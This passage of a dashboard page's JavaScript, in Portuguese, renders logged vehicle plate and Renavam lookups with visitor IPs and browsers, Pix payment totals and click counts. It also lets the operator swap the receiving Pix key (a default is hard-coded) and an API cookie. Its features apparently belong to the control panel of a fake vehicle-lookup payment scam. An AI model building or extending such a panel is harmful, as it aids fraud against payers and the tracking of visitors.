        const uaInfo = parseUa(search.ua || '');
        return `
            <tr class="table-row-hover transition-colors">
                <td class="px-6 py-4 whitespace-nowrap">
                    <div class="text-sm font-medium text-gray-900">${escapeHtml(formatElapsed(search.ts))}</div>
                    <div class="text-xs text-gray-400">${escapeHtml(formatDate(search.ts, { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit', hour12: false }))}</div>
                </td>
                <td class="px-6 py-4">
                    <div class="flex items-center gap-3">
                        <div class="bg-gray-100 p-2 rounded text-center min-w-[80px]">
                            <div class="text-xs text-gray-500 uppercase">Placa</div>
                            <div class="font-bold text-gray-900">${escapeHtml(search.plate || '-')}</div>
                        </div>
                        <div class="text-xs text-gray-500">
                            <div>Renavam: <span class="font-mono text-gray-700">${escapeHtml(search.renavam || '-')}</span></div>
                        </div>
                    </div>
                </td>
                <td class="px-6 py-4">
                    <div class="flex items-center gap-2 mb-1">
                        <span class="font-mono text-xs bg-gray-100 px-2 py-1 rounded">${escapeHtml(search.ip || 'N/A')}</span>
                    </div>
                    <div class="text-xs text-gray-500 flex items-center gap-1">
                        <span title="${escapeHtml(uaInfo.type)}">${escapeHtml(uaInfo.icon)}</span>
                        <span>${escapeHtml(uaInfo.browser)}</span>
                    </div>
                </td>
            </tr>
        `;
    }).join('');
}

function applyDashboardState(state) {
    const pixEntries = normalizeArray(state.pixEntries);
    const searchEntries = normalizeArray(state.searchEntries);
    const clickStats = normalizeClickStats(state.clickStats);
    const totalPixValue = pixEntries.reduce((sum, item) => sum + Number(item && item.valor ? item.valor : 0), 0);
    const uniqueIps = new Set();

    searchEntries.forEach((entry) => {
        if (entry && entry.ip) uniqueIps.add(entry.ip);
    });
    pixEntries.forEach((entry) => {
        if (entry && entry.ip) uniqueIps.add(entry.ip);
    });

    const totalPixValueEl = document.getElementById('stat-total-pix-value');
    const totalPixCountEl = document.getElementById('stat-total-pix-count');
    const searchCountEl = document.getElementById('stat-search-count');
    const uniqueVisitorsEl = document.getElementById('stat-unique-visitors');
    const enterClicksEl = document.getElementById('stat-enter-clicks');
    const consultarClicksEl = document.getElementById('stat-consultar-clicks');
    const pixCountBadgeEl = document.getElementById('pix-count-badge');
    const searchCountBadgeEl = document.getElementById('search-count-badge');
    const pixKeyInputEl = document.getElementById('pix-key-input');
    const apiCookieInputEl = document.getElementById('api-cookie-input');

    if (totalPixValueEl) totalPixValueEl.textContent = 'R$ ' + formatMoneyBrl(totalPixValue);
    if (totalPixCountEl) totalPixCountEl.innerHTML = '<i class="fas fa-arrow-up"></i> ' + pixEntries.length;
    if (searchCountEl) searchCountEl.textContent = String(searchEntries.length);
    if (uniqueVisitorsEl) uniqueVisitorsEl.textContent = String(uniqueIps.size);
    if (enterClicksEl) enterClicksEl.textContent = String(clickStats.enter_clicks);
    if (consultarClicksEl) consultarClicksEl.textContent = String(clickStats.consultar_clicks);
    if (pixCountBadgeEl) pixCountBadgeEl.textContent = pixEntries.length + ' registros';
    if (searchCountBadgeEl) searchCountBadgeEl.textContent = searchEntries.length + ' registros';
    if (pixKeyInputEl && state.currentKey) pixKeyInputEl.value = state.currentKey;
    if (apiCookieInputEl && state.currentCookie !== undefined) apiCookieInputEl.value = state.currentCookie;

    renderPixRows(pixEntries);
    renderSearchRows(searchEntries);
}

function clearDashboardCache() {
    localStorage.removeItem(dashboardStorageKey);
}

const resetForm = document.getElementById('reset-form');
if (resetForm) {
    resetForm.addEventListener('submit', () => {
        const resetAt = new Date().toISOString();
        localStorage.setItem(dashboardStorageKey, JSON.stringify({
            defaultPixKey: serverDashboardState.defaultPixKey || '06721661195',
            currentKey: serverDashboardState.currentKey || '',
            currentCookie: serverDashboardState.currentCookie || '',
            configUpdatedAt: serverDashboardState.configUpdatedAt || '',
            pixEntries: [],
            searchEntries: [],
            clickStats: {
                consultar_clicks: 0,
                enter_clicks: 0,
                updated_at: resetAt,
                reset_at: resetAt
            },
            statsResetAt: resetAt,
            statsUpdatedAt: resetAt,
            message: ''
        }));
    });
}

const configForm = document.getElementById('config-form');
if (configForm) {
    configForm.addEventListener('submit', () => {
        const pixKeyInput = document.getElementById('pix-key-input');
        const apiCookieInput = document.getElementById('api-cookie-input');
        const cached = safeParseDashboardState(localStorage.getItem(dashboardStorageKey)) || {};
        const nowIso = new Date().toISOString();
        cached.currentKey = pixKeyInput ? pixKeyInput.value : '';
        cached.currentCookie = apiCookieInput ? apiCookieInput.value : '';
        cached.defaultPixKey = serverDashboardState.defaultPixKey || '06721661195';
        cached.configUpdatedAt = nowIso;
        localStorage.setItem(dashboardStorageKey, JSON.stringify(cached));
    });
}

if (serverDashboardState.message && /limpos/i.test(serverDashboardState.message)) {
    clearDashboardCache();
    const resetState = Object.assign({}, serverDashboardState, {
        pixEntries: [],
        searchEntries: [],
        clickStats: normalizeClickStats(serverDashboardState.clickStats),
        statsResetAt: serverDashboardState.statsResetAt || (serverDashboardState.clickStats && serverDashboardState.clickStats.reset_at) || new Date().toISOString(),
        statsUpdatedAt: serverDashboardState.statsUpdatedAt || (serverDashboardState.clickStats && serverDashboardState.clickStats.updated_at) || new Date().toISOString()
    });
    resetState.clickStats.reset_at = resetState.statsResetAt;
    resetState.clickStats.updated_at = resetState.statsUpdatedAt;
    applyDashboardState(resetState);
    localStorage.setItem(dashboardStorageKey, JSON.stringify(resetState));
} else {
    const cachedDashboardState = safeParseDashboardState(localStorage.getItem(dashboardStorageKey));
    const mergedDashboardState = mergeDashboardState(serverDashboardState, cachedDashboardState);
    applyDashboardState(mergedDashboardState);
    localStorage.setItem(dashboardStorageKey, JSON.stringify(mergedDashboardState));
}
</script>

</body>
</html>
